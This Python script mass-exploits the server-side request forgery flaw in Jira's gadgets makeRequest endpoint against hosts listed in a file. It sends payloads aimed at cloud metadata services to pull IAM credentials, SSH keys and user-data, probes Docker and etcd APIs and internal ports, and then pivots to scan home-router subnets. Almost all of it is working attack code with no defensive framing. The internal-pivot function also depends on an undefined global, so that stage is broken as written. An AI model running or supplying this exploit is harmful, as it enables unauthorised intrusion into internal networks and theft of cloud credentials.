import requests
import time
import multiprocessing
import json
pool_size = multiprocessing.cpu_count()
filein = open('holyshit.txt')

all_lines = filein.readlines()
test_ports = ['22','80']

ports = ['21','22','23','25','53','80','111','161','137','443','445','2049','2087','2082','2083','3306','3389','8080','8060','8443','9200','9000','11211','6379','10050']
internal_pivots = []


ssrf_csp_etc = [
"192.168.1.1:80/login/login.cgi",
"192.168.1.1:80/Main_Login.asp",
"metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",
"metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json",
"169.254.169.254/metadata/v1.json",
"100.100.100.200/latest/meta-data/image-id",
"100.100.100.200/latest/meta-data/instance-id",
"100.100.100.200/latest/meta-data/nvpc-cidr-block",
"169.254.169.254/metadata/v1/maintenance",
"169.254.169.254/metadata/v1/",
"169.254.169.254/openstack",
"169.254.169.254/2009-04-04/meta-data/",
"192.0.0.192/latest/",
"192.0.0.192/latest/user-data/",
"192.0.0.192/latest/meta-data/",
"192.0.0.192/latest/attributes/",
"127.0.0.1:2379/version",
"127.0.0.1:2379/v2/keys/?recursive=true",
"127.0.0.1:2375/v1.24/containers/json",
"http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance",
"http://169.254.169.254/latest/meta-data/ami-id",
"http://169.254.169.254/latest/meta-data/reservation-id",
"http://169.254.169.254/latest/meta-data/hostname",
"http://169.254.169.254/latest/meta-data/public-keys/",
"http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
"http://169.254.169.254/latest/meta-data/",
"http://169.254.169.254/latest/user-data",
"http://172.25.64.3/latest/meta-data/instance-id",
"127.0.0.1:8080/rest/api/latest/",
"127.0.0.1:8080/rest/api/2/user?username=admin",
"127.0.0.1/rest/api/2/user?username=admin",
]

def ip_gen_internal(octet3):
    natural_order = []
    octet = range(25)
    for last_octet in octet:
        tmp_ip = str(octet3) + str(last_octet)
        natural_order.append(tmp_ip)
    return natural_order
    
def jira_ssrf_port_scan():
    payloads = []   
    for port in ports:
        pass1= "127.1.1.1:"+port+"#\@127.2.2.2:"+port+"/"
        pass2 = "[::]:"+port+"/"
        pass3 = "localhost:"+port
        pass4 = "0.0.0.0:"+port
        pass5 = "127.0.0.1:"+port
        pass6= "127.1.1.1:"+port+"#\@127.2.2.2:"+port+"/server-status"
        pass7 = "[::]:"+port+"/server-status"
        pass8 = "localhost:"+port+"/server-status"
        pass9 = "0.0.0.0:"+port+"/server-status"
        pass10 = "127.0.0.1:"+port +"/server-status"
        pass11 = "[::]:"+port+"/server-status"
        pass12 = "localhost:"+port+"/server-status"
        pass13 = "0.0.0.0:"+port+"/server-status"
        pass14 = "127.0.0.1:"+port +"/server-status"
        pass10 = "127.0.0.1:"+port +"/phpmyadmin"
        pass11 = "[::]:"+port+"/phpmyadmin"
        pass12 = "localhost:"+port+"/phpmyadmin"
        pass13 = "0.0.0.0:"+port+"/phpmyadmin"
        pass14 = "127.0.0.1:"+port +"/phpmyadmin"
        pass15 = "127.0.0.1:"+port +"/api"
        pass16 = "127.0.0.1:"+port +"/jira/rest/api/2/"
        pass16 = "127.0.0.1:"+port +"/jira/rest/api/2/"
        payloads.append(pass1)
        payloads.append(pass2)
        payloads.append(pass3)
        payloads.append(pass4)
        payloads.append(pass5)
        payloads.append(pass6)
        payloads.append(pass7)
        payloads.append(pass8)
        payloads.append(pass9)
        payloads.append(pass10)
        payloads.append(pass11)
        payloads.append(pass12)
        payloads.append(pass13)
        payloads.append(pass14)
        payloads.append(pass15)
    return  payloads  


def check_Aws_ssrf(url,payload):
    print("In Check SSrf") 
    
    vuln_url = url + "/plugins/servlet/gadgets/makeRequest?url=" + url + '@' + str(payload)
    headers = {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
          "Accept": "*/*",
          "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
          "Accept-Encoding": "gzip, deflate",
          "X-Atlassian-Token": "no-check",
          "Connection": "close"
          }

    r = requests.get(url=vuln_url, headers=headers,timeout=3,verify=False)
    if (r.status_code != 200):
       print(" Something went wrong! ")
       if (r.status_code == 302):
           print(" Redirected. Try this instead: " + r.headers['Location'])
           return r.headers['Location'],r.status_code,r.headers
       else:
           print("Not Good Status: " + str(r.status_code))
	
    return r.text,r.status_code,r.headers
    

def check_Aws_ssrf_mod(payload):
    vuln_url = url+"/plugins/servlet/gadgets/makeRequest?url="+url+'@'+str(payload)
    print(vuln_url)
    headers = {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
          "Accept": "*/*",
          "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
          "Accept-Encoding": "gzip, deflate",
          "X-Atlassian-Token": "no-check",
          "Connection": "close"
          }
    try:
       r = requests.get(url=vuln_url, headers=headers,timeout=3,verify=False)
    
       if (r.status_code == 200):
          return [r.text,r.status_code,url.rstrip()]
       if (r.status_code != 200):
          print(" Something went wrong! ")
          return [r.text,r.status_code,url.rstrip()]
       if (r.status_code == 302):
           print(" Redirected. Try this instead: " + r.headers['Location'])
           return [r.text,r.status_code,url.rstrip()]
       else:
           print("Not Good Status: " + str(r.status_code))
           
           
    except Exception as shit:
        print(shit)
        pass
    

if __name__ == '__main__':
   jira_ports = jira_ssrf_port_scan()
   valid_csp_hits = []

   for line in all_lines:
       hits = []
       tmp_url = json.loads(line)
       for ssrf_tests in jira_ports:
           
           try:            
              response,status,headers = check_Aws_ssrf(tmp_url['url'],ssrf_tests)
              if '"rc":200' in response:
                 print(" Host appears to be vulnerable port is open: " +ssrf_tests)
                
                 print(headers)
                 print(response)
                 hits.append(ssrf_tests)
            
              if '"rc":500' in response:
                 print(" Host appears to be vulnerable but port is closed! ")
           except:
               pass
            
       host_info = {}
       host_info['url'] = tmp_url['url']
       host_info['csp_hits'] = hits
       valid_csp_hits.append(json.dumps(host_info))
       for hit in hits:
           if "192.168.1."  in hit:
              print("Detected Internal Router Probing NEtwork for ips")
              ips = ip_gen_internal("192.168.1.")
              print(ips)
              attack_internal = []
              for ip in ips:
                  for port in test_ports:
                      tmp = ip + ":"+port
                      attack_internal.append(tmp)
              print(attack_internal)
              try:
                 pool = multiprocessing.Pool(processes=pool_size)         
                 info = pool.map(check_Aws_ssrf_mod,attack_internal)
                 pool.close() 
                 pool.join()
                 for items in info:
                     if '"rc":200' in items[0]:
                        print(" Host appears to be vulnerable port is open: ")
                        newshit = {}
                        newshit['status'] = items[1]
                        newshit['vuln_url'] = items[2]
                        internal_pivots.append(json.dumps(newshit))
                 
       
                     if '"rc":500' in items[0]:
                         print(" Host appears to be vulnerable but internal port is closed! ")
             
      
              except Exception as ohno:
                  print(ohno)
                  pass
              
           if "192.168.0."  in hit:
              print("Detected Internal Router Probing NEtwork for ips")
              ips = ip_gen_internal("192.168.0.")
              attack_internal = []
              for ip in ips:
                  for port in test_ports:
                      tmp = ip + ":"+port
                      attack_internal.append(tmp)
              print(len(attack_internal))
              
              try:
                 pool = multiprocessing.Pool(processes=pool_size)         
                 info = pool.map(check_Aws_ssrf_mod,attack_internal)
                 pool.close() 
                 pool.join()
                 for items in info:
                     if '"rc":200' in items[0]:
                        print(" Host appears to be vulnerable port is open: ")
                        newshit = {}
                        newshit['status'] = items[1]
                        newshit['vuln_url'] = items[2]
                        internal_pivots.append(json.dumps(newshit))
                 
       
                     if '"rc":500' in items[0]:
                         print(" Host appears to be vulnerable but internal port is closed! ")
          
      
              except Exception as ohno:
                  print(ohno)
                  pass
              
   for info  in valid_csp_hits:
       print(info)

